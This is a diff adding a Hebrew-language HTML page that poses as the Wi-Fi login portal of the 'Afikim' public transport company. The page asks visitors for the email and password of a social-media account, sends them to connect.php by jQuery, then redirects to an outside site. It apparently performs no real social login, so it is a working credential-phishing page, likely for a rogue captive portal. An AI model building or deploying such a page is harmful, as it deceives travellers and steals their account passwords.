@@ -1,0 +1,61 @@
+<!doctype html>
+<html lang="he-IL">
+<head>
+	<meta charset="UTF-8">
+	<title>אפיקים תחבורה ציבורית - Afikim</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1" />
+	<meta name="description" content="אפיקים תחבורה ציבורית - Afikim">
+	<link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
+	<link rel="stylesheet" href="style.css" type="text/css">
+</head>
+
+<body>
+	<div class="inner-container">
+		<div class="hide-container">
+			<p><a href="javascript://" class="logo"><img src="images/logo.png"></a></p>
+			<ul id="icons">
+			<li><a href="javascript://" title="facebook" class="tooltip"><img src="social/fb.png" alt="" class="icon"></a></li>
+			<li><a href="javascript://" title="twitter" class="tooltip"><img src="social/twitter.png" alt="" class="icon"></a></li>
+			<li><a href="javascript://" title="google" class="tooltip"><img src="social/gplus.png" alt="" class="icon"></a></li>
+			<li><a href="javascript://" title="linkedin" class="tooltip"><img src="social/linkedin.png" alt="" class="icon"></a></li>
+			</ul>	
+			<div class="box">
+				<h1>התחברות</h1><form id="formSend" name="theform" action="javascript://" method="post" onsubmit="return validateForm();">
+				<!- http://10.0.0.1/ ->
+				<select name="socialn" class="list">
+				<option value="facebook">Facebook</option>
+				<option value="twitter">Twitter</option>
+				<option value="google" selected>Google+</option>
+				<option value="linkedin">Linkedin</option>
+				</select>
+				<input type="email" name="email" required placeholder="כתובת מייל"/>
+				<input type="password" name="userpassword" required placeholder="סיסמה"/>
+				<input type="submit" value="כניסה" class="button">
+				</form>
+				<p><small>.אין צורך בהרשמה. התחבר באמצעות החשבון החברתי שלך</small></p>
+			</div>
+		</div>
+		<div class="show-container"><div class="box"><p>!תודה ,שיהיה גלישה נעימה</p></div></div>
+	</div>
+	<script src="jquery.min.js"></script>
+	<script>
+	var show = $('.show-container');
+	var hide = $('.hide-container');
+		// Send post
+		$('form#formSend').submit(function(){
+			$.post('connect.php', $(this).serialize())  .done(function() {
+				hide.fadeOut('slow', function(){show.fadeIn('slow', function(){setTimeout(function(){window.location.replace('http://afikim-t.co.il/connect.php')}, 2000)})});
+			})
+			.fail(function() {
+				alert('An unknown error occurred!');
+			});	
+		});
+		// Select on icon click
+		$('.tooltip').click(function(){
+			var select = $(this).attr('title');
+			$('div.box select').val(select).change();
+		});	
+	</script>
+	<div class="social-icons"></div>
+</body>
+</html>
